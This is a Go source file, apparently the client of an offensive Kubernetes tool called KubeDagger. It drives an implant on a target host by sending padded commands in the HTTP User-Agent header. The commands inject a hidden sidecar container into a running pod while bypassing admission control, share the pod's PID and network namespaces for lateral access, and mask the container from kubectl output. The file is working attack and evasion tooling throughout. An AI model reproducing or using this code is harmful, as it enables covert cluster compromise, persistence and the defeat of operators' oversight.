package sidecar_inject

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/model"
)

type InjectResult struct {
	Actions []ActionInfo `json:"actions"`
	Success bool         `json:"success"`
}

type ActionInfo struct {
	Name   string `json:"name"`
	Status string `json:"status"`
	Detail string `json:"detail"`
}

func Execute(target, podName, image, namespace, output string) error {
	result := &InjectResult{}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"connect_kubelet_api",
			"connect to local kubelet container creation API (bypasses admission control)",
			"sidecar_connect_kubelet",
		},
		{
			"create_container_spec",
			"build sidecar container spec with shared PID/network namespace",
			"sidecar_create_spec",
		},
		{
			"inject_sidecar",
			"inject sidecar container into running pod via CRI runtime API",
			"sidecar_inject",
		},
		{
			"configure_shared_ns",
			"configure shared PID and network namespace for lateral access",
			"sidecar_share_ns",
		},
		{
			"hide_container",
			"mask injected container from kubectl get pods output via API interception",
			"sidecar_hide",
		},
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + podName + "#" + image + "#" + namespace
		status := sendCommand(target, cmd)
		result.Actions = append(result.Actions, ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = allSucceeded(result.Actions)

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}

func sendCommand(target, command string) string {
	ua := buildUserAgent(command)

	req, err := http.NewRequest("GET", target+"/sidecar_inject", nil)
	if err != nil {
		return "error: " + err.Error()
	}
	req.Header.Set("User-Agent", ua)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "error: " + err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		return "enabled"
	}
	return fmt.Sprintf("failed (HTTP %d)", resp.StatusCode)
}

func buildUserAgent(command string) string {
	userAgent := command
	for len(userAgent) < model.UserAgentPaddingLen {
		userAgent += "#"
	}
	return userAgent
}

func allSucceeded(actions []ActionInfo) bool {
	for _, a := range actions {
		if !strings.HasPrefix(a.Status, "enabled") {
			return false
		}
	}
	return true
}
